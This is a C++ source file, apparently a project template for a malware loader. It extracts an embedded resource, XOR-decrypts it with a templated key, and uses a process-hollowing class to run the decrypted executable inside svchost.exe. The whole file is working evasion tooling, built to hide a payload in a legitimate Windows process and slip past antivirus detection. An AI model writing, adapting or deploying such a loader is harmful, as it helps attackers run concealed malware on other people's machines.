#include "resource.h"
#include "processHollower.h"

using namespace std;

VOID DecryptPE(char *lpGuestPEData, DWORD dwResourceSize) {
    char key[] = "{{ cookiecutter.encryption_key }}";
    int keyLength = strlen(key);

    for (int i = 0; i < dwResourceSize; i++) {
        lpGuestPEData[i] ^= key[i % keyLength];
    }
}
int main() {
    HRSRC hResource = FindResource(nullptr, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    DWORD dwResourceSize = SizeofResource(nullptr, hResource);
    HGLOBAL hResourceData = LoadResource(nullptr, hResource);
    PVOID pResourceData = LockResource(hResourceData);
    char* lpGuestPEData = new char[dwResourceSize];
    CopyMemory(lpGuestPEData, pResourceData, dwResourceSize);

    DecryptPE(lpGuestPEData, dwResourceSize);

    ProcessHollower PHollower;
//    char lpHostApplicationName[ MAX_PATH ];
//    GetModuleFileName(nullptr, lpHostApplicationName, MAX_PATH+1);
    #ifdef _WIN64
        char lpHostApplicationName[] = R"(C:\Windows\System32\svchost.exe)";
    #else
        char lpHostApplicationName[] = R"(C:\Windows\SysWOW64\svchost.exe)";
    #endif
    if (!PHollower.execute(lpHostApplicationName, lpGuestPEData))
        return -1;
    return 0;
}